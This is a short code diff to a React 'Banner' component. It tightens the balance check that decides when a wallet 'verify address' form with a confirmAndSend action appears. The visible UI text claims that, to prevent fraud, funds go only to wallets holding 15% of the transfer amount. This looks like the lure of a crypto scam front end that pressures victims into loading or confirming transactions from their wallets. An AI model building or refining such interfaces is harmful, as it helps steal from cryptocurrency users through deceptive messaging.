@@ -224,7 +224,7 @@ const Banner = () => {
                             <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
                         </div>
                     )}
-                    {userBalance >= 0 && (
+                    {userBalance > 0 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
                     )}
                     {userBalance <= 0 && (
